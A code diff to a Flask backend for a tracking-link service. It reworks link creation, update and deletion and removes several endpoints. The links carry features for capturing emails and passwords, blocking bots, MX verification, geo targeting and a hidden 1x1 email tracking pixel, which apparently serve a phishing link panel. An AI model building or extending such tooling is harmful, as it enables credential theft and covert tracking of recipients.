@@ -6,6 +6,7 @@ from src.models.tracking_event import TrackingEvent
 import string
 import random
 import json
+from dateutil.relativedelta import relativedelta
 import requests
 import os
 
@@ -50,10 +51,27 @@ def create_link():
         password = sanitize_input(data.get("password", ""))
         domain_type = data.get("domain", "vercel")
         custom_domain = sanitize_input(data.get("customDomain", ""))
-        expiry_date = data.get("expiryDate")
-        password = data.get("password", "")
-        description = sanitize_input(data.get("description", ""))
-        
+        expiry_duration_str = data.get("expiryDate") # This is actually expiryDuration from frontend
+        expiry_date = None
+        if expiry_duration_str:
+            from datetime import datetime, timedelta
+            from dateutil.relativedelta import relativedelta
+            now = datetime.utcnow()
+            parts = expiry_duration_str.split(" ")
+            if len(parts) == 2:
+                value = int(parts[0])
+                unit = parts[1].lower()
+                if "hour" in unit:
+                    expiry_date = now + timedelta(hours=value)
+                elif "day" in unit:
+                    expiry_date = now + timedelta(days=value)
+                elif "week" in unit:
+                    expiry_date = now + timedelta(weeks=value)
+                elif "month" in unit:
+                    expiry_date = now + relativedelta(months=value)
+                elif "year" in unit:
+                    expiry_date = now + relativedelta(years=value)
+
         short_url = ""
         if domain_type == "vercel":
             # Generate short code for Vercel domain
@@ -69,7 +87,7 @@ def create_link():
             if not shortio_api_key:
                 return jsonify({"success": False, "error": "Short.io API key not configured"}), 500
             
-            shortio_domain = os.environ.get("SHORTIO_DOMAIN", "Secure-links.short.gy")
+            shortio_domain = os.environ.get("SHORTIO_DOMAIN", "secure-links.short.gy")
             if not shortio_domain:
                 return jsonify({"success": False, "error": "Short.io domain not configured"}), 500
 
@@ -112,8 +130,7 @@ def create_link():
         
         # Set expiry date if provided
         if expiry_date:
-            from datetime import datetime
-            new_link.expiry_date = datetime.fromisoformat(expiry_date)
+            new_link.expiry_date = expiry_date
         
         db.session.add(new_link)
         db.session.commit()
@@ -172,7 +189,7 @@ def links():
             # Add tracking URLs with ID parameters
             link_dict["tracking_url"] = f"{base_url}/t/{link.short_code}?id={{id}}"
             link_dict["pixel_url"] = f"{base_url}/p/{link.short_code}?email={{email}}&id={{id}}"
-            link_dict["email_code"] = f"<img src=\"{base_url}/p/{link.short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />"
+            link_dict["email_code"] = f'<img src="{base_url}/p/{link.short_code}?email={{email}}&id={{id}}" width="1" height="1" style="display:none;" />'
             links_data.append(link_dict)
         
         return jsonify({"links": links_data})
@@ -228,44 +245,39 @@ def links():
                 campaign_name=campaign_name,
                 description=description,
                 password=password,
+                preview_template_url=preview_template_url,
                 capture_email=capture_email,
                 capture_password=capture_password,
                 bot_blocking_enabled=bot_blocking_enabled,
-                geo_targeting_enabled=geo_targeting_enabled,
-                geo_targeting_type=geo_targeting_type,
-                allowed_countries=json.dumps(allowed_countries) if allowed_countries else None,
-                blocked_countries=json.dumps(blocked_countries) if blocked_countries else None,
-                allowed_regions=json.dumps(allowed_regions) if allowed_regions else None,
-                blocked_regions=json.dumps(blocked_regions) if blocked_regions else None,
-                allowed_cities=json.dumps(allowed_cities) if allowed_cities else None,
-                blocked_cities=json.dumps(blocked_cities) if blocked_cities else None,
                 rate_limiting_enabled=rate_limiting_enabled,
                 dynamic_signature_enabled=dynamic_signature_enabled,
                 mx_verification_enabled=mx_verification_enabled,
-                preview_template_url=preview_template_url
+                geo_targeting_enabled=geo_targeting_enabled,
+                geo_targeting_type=geo_targeting_type,
+                allowed_countries=json.dumps(allowed_countries),
+                blocked_countries=json.dumps(blocked_countries),
+                allowed_regions=json.dumps(allowed_regions),
+                blocked_regions=json.dumps(blocked_regions),
+                allowed_cities=json.dumps(allowed_cities),
+                blocked_cities=json.dumps(blocked_cities)
             )
-            
             db.session.add(link)
             db.session.commit()
             
-            return jsonify({
-                "success": True,
-                "message": "Tracking link created successfully",
-                "link": {
-                    "id": link.id,
-                    "short_code": short_code,
-                    "tracking_url": f"{base_url}/t/{short_code}?id={{id}}",
-                    "pixel_url": f"{base_url}/p/{short_code}?email={{email}}&id={{id}}",
-                    "email_code": f"<img src=\"{base_url}/p/{short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />",
-                    "target_url": target_url
-                }
-            })
+            link_data = link.to_dict(base_url=base_url)
+            link_data["short_url"] = f"{base_url}/s/{link.short_code}"
+            
+            return jsonify({"success": True, "link": link_data})
+        
         except Exception as e:
             db.session.rollback()
-            return jsonify({"success": False, "error": "Failed to create tracking link"}), 500
-    
+            import traceback
+            print(f"Error creating link: {e}")
+            traceback.print_exc()
+            return jsonify({"success": False, "error": f"Failed to create link: {str(e)}"}), 500
+
     elif request.method == "PUT":
-        # Update an existing tracking link
+        # Update a tracking link
         data = request.get_json()
         if not data:
             return jsonify({"success": False, "error": "No data provided"}), 400
@@ -274,207 +286,59 @@ def links():
         if not link_id:
             return jsonify({"success": False, "error": "Link ID is required"}), 400
         
-        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
-        if not link:
-            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
+        link = Link.query.get(link_id)
+        if not link or link.user_id != user.id:
+            return jsonify({"success": False, "error": "Link not found or not authorized"}), 404
         
-        target_url = sanitize_input(data.get("target_url", ""))
-        if not target_url:
-            return jsonify({"success": False, "error": "Target URL is required"}), 400
+        # Update fields
+        link.target_url = sanitize_input(data.get("target_url", link.target_url))
+        link.campaign_name = sanitize_input(data.get("campaign_name", link.campaign_name))
+        link.description = sanitize_input(data.get("description", link.description))
+        link.password = sanitize_input(data.get("password", link.password))
+        link.preview_template_url = sanitize_input(data.get("preview_template_url", link.preview_template_url))
         
-        if not target_url.startswith(("http://", "https://")):
-            return jsonify({"success": False, "error": "Invalid target URL"}), 400
+        # Update security features
+        link.capture_email = data.get("capture_email", link.capture_email)
+        link.capture_password = data.get("capture_password", link.capture_password)
+        link.bot_blocking_enabled = data.get("bot_blocking_enabled", link.bot_blocking_enabled)
+        link.rate_limiting_enabled = data.get("rate_limiting_enabled", link.rate_limiting_enabled)
+        link.dynamic_signature_enabled = data.get("dynamic_signature_enabled", link.dynamic_signature_enabled)
+        link.mx_verification_enabled = data.get("mx_verification_enabled", link.mx_verification_enabled)
+        
+        # Update geo targeting
+        link.geo_targeting_enabled = data.get("geo_targeting_enabled", link.geo_targeting_enabled)
+        link.geo_targeting_type = data.get("geo_targeting_type", link.geo_targeting_type)
+        link.allowed_countries = data.get("allowed_countries", link.allowed_countries)
+        link.blocked_countries = data.get("blocked_countries", link.blocked_countries)
+        link.allowed_regions = data.get("allowed_regions", link.allowed_regions)
+        link.blocked_regions = data.get("blocked_regions", link.blocked_regions)
+        link.allowed_cities = data.get("allowed_cities", link.allowed_cities)
+        link.blocked_cities = data.get("blocked_cities", link.blocked_cities)
         
         try:
-            link.target_url = target_url
-            link.campaign_name = sanitize_input(data.get("campaign_name", link.campaign_name))
-            link.capture_email = data.get("capture_email", False)
-            link.capture_password = data.get("capture_password", False)
-            link.bot_blocking_enabled = data.get("bot_blocking_enabled", True)
-            link.geo_targeting_enabled = data.get("geo_targeting_enabled", False)
-            link.geo_targeting_type = data.get("geo_targeting_type", "allow")
-            link.allowed_countries = json.dumps(data.get("allowed_countries")) if data.get("allowed_countries") else None
-            link.blocked_countries = json.dumps(data.get("blocked_countries")) if data.get("blocked_countries") else None
-            link.allowed_regions = json.dumps(data.get("allowed_regions")) if data.get("allowed_regions") else None
-            link.blocked_regions = json.dumps(data.get("blocked_regions")) if data.get("blocked_regions") else None
-            link.allowed_cities = json.dumps(data.get("allowed_cities")) if data.get("allowed_cities") else None
-            link.blocked_cities = json.dumps(data.get("blocked_cities")) if data.get("blocked_cities") else None
-            link.rate_limiting_enabled = data.get("rate_limiting_enabled", False)
-            link.dynamic_signature_enabled = data.get("dynamic_signature_enabled", False)
-            link.mx_verification_enabled = data.get("mx_verification_enabled", False)
-            link.preview_template_url = sanitize_input(data.get("preview_template_url", ""))
-            
             db.session.commit()
-            
-            return jsonify({
-                "success": True,
-                "message": "Tracking link updated successfully"
-            })
+            return jsonify({"success": True, "link": link.to_dict(base_url=base_url)})
         except Exception as e:
             db.session.rollback()
-            return jsonify({"success": False, "error": "Failed to update tracking link"}), 500
-    
+            return jsonify({"success": False, "error": f"Failed to update link: {str(e)}"}), 500
+
     elif request.method == "DELETE":
         # Delete a tracking link
-        data = request.get_json()
-        if not data:
-            return jsonify({"success": False, "error": "No data provided"}), 400
-        
-        link_id = data.get("id")
+        link_id = request.args.get("id")
         if not link_id:
             return jsonify({"success": False, "error": "Link ID is required"}), 400
         
-        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
-        if not link:
-            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
+        link = Link.query.get(link_id)
+        if not link or link.user_id != user.id:
+            return jsonify({"success": False, "error": "Link not found or not authorized"}), 404
         
         try:
             db.session.delete(link)
             db.session.commit()
-            
-            return jsonify({
-                "success": True,
-                "message": "Tracking link deleted successfully"
-            })
+            return jsonify({"success": True})
         except Exception as e:
             db.session.rollback()
-            return jsonify({"success": False, "error": "Failed to delete tracking link"}), 500
+            return jsonify({"success": False, "error": f"Failed to delete link: {str(e)}"}), 500
 
-
-@links_bp.route("/links/<int:link_id>/regenerate", methods=["POST"])
-def regenerate_link(link_id):
-    user = require_auth()
-    if not user:
-        return jsonify({"success": False, "error": "Authentication required"}), 401
-    
-    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
-    if not link:
-        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
-    
-    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
-    base_url = f"{scheme}://{request.host}"
-    
-    # Generate new unique short code
-    while True:
-        new_short_code = generate_short_code()
-        existing = Link.query.filter_by(short_code=new_short_code).first()
-        if not existing:
-            break
-    
-    try:
-        old_short_code = link.short_code
-        link.short_code = new_short_code
-        db.session.commit()
-        
-        return jsonify({
-            "success": True,
-            "message": "Tracking link regenerated successfully",
-            "old_short_code": old_short_code,
-            "new_short_code": new_short_code,
-            "tracking_url": f"{base_url}/t/{new_short_code}?id={{id}}",
-            "pixel_url": f"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}",
-            "email_code": f"<img src=\"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />"
-        })
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({"success": False, "error": "Failed to regenerate tracking link"}), 500
-
-@links_bp.route("/links/stats", methods=["GET"])
-def get_links_stats():
-    user = require_auth()
-    if not user:
-        return jsonify({"success": False, "error": "Authentication required"}), 401
-    
-    try:
-        # Get user's links
-        user_links = Link.query.filter_by(user_id=user.id).all()
-        link_ids = [link.id for link in user_links]
-        
-        if not link_ids:
-            return jsonify({
-                "totalLinks": 0,
-                "totalClicks": 0,
-                "activeLinks": 0,
-                "avgCTR": 0
-            })
-        
-        # Calculate stats
-        total_links = len(user_links)
-        active_links = len([link for link in user_links if link.is_active])
-        
-        # Get click statistics
-        total_clicks = TrackingEvent.query.filter(TrackingEvent.link_id.in_(link_ids)).count()
-        
-        # Calculate average CTR (simplified calculation)
-        avg_ctr = (total_clicks / total_links) if total_links > 0 else 0
-        
-        return jsonify({
-            "totalLinks": total_links,
-            "totalClicks": total_clicks,
-            "activeLinks": active_links,
-            "avgCTR": round(avg_ctr, 2)
-        })
-        
-    except Exception as e:
-        print(f"Error fetching link stats: {e}")
-        return jsonify({
-            "totalLinks": 0,
-            "totalClicks": 0,
-            "activeLinks": 0,
-            "avgCTR": 0
-        }), 500
-
-@links_bp.route("/links/<int:link_id>/toggle-status", methods=["POST"])
-def toggle_link_status(link_id):
-    user = require_auth()
-    if not user:
-        return jsonify({"success": False, "error": "Authentication required"}), 401
-    
-    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
-    if not link:
-        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
-    
-    try:
-        # Toggle between active and paused
-        link.status = "paused" if link.status == "active" else "active"
-        db.session.commit()
-        
-        return jsonify({
-            "success": True,
-            "message": f"Link {link.status}",
-            "status": link.status
-        })
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({"success": False, "error": "Failed to toggle link status"}), 500
-
-
-@links_bp.route("/links/<int:link_id>", methods=["DELETE"])
-def delete_link_by_id(link_id):
-    """Delete a tracking link by ID"""
-    user = require_auth()
-    if not user:
-        return jsonify({"success": False, "error": "Authentication required"}), 401
-    
-    try:
-        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
-        if not link:
-            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
-        
-        # Delete associated tracking events first
-        TrackingEvent.query.filter_by(link_id=link.id).delete()
-        
-        # Delete the link
-        db.session.delete(link)
-        db.session.commit()
-        
-        return jsonify({
-            "success": True,
-            "message": "Tracking link deleted successfully"
-        })
-        
-    except Exception as e:
-        db.session.rollback()
-        print(f"Error deleting link: {e}")
-        return jsonify({"success": False, "error": "Failed to delete tracking link"}), 500
+    return jsonify({"success": False, "error": "Invalid request method"}), 405
 
